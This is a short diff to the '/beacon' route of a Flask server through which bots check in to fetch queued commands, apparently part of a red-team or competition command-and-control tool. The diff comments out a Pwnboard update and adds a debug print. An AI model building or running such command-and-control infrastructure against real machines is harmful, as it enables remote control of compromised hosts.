@@ -67,11 +67,12 @@ Description: page bot beacons to for get commands
 @app.route('/beacon')
 def beacon():
 	ip = request.args.get('ip')
-	updatePwnboard(ip)
+	#updatePwnboard(ip)
 	if ip not in bots:
 		bots[ip] = []
 		botsExe[ip] = []
 	else:
+		print(json.dumps(bots[ip]))
 		return json.dumps(bots[ip])
 	return json.dumps('')
 		
